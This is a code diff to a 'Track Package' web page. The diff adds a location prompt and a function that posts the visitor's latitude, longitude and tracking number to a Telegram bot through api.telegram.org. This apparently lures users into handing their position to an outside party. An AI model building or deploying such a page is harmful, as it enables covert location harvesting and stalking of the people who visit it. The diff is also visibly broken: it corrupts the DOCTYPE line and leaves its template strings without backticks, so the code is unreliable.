@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html>
   <head>
     <title>Track Package</title>
@@ -86,3 +86,44 @@
           showModal();
         }
       });
+
+      document.querySelector('.close-button').addEventListener('click', function() {
+        hideModal();
+      });
+
+      document.getElementById('allow-location').addEventListener('click', function() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            sendLocationToTelegram(latitude, longitude);
+            alert('Location sent to Telegram. Tracking your package...');
+            hideModal();
+          });
+        } else {
+          alert('Geolocation is not supported by this browser.');
+        }
+      });
+
+      function showModal() {
+        document.getElementById('tracking-modal').style.display = 'block';
+      }
+
+      function hideModal() {
+        document.getElementById('tracking-modal').style.display = 'none';
+      }
+
+      function sendLocationToTelegram(lat, lon) {
+        const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+        const chatId = 'YOUR_CHAT_ID';
+        const url = https://api.telegram.org/bot${botToken}/sendMessage;
+        const msg = Tracking number: ${document.getElementById('tracking-number').value}\nLatitude: ${lat}\nLongitude: ${lon};
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: msg })
+        });
+      }
+    </script>
+  </body>
+</html>
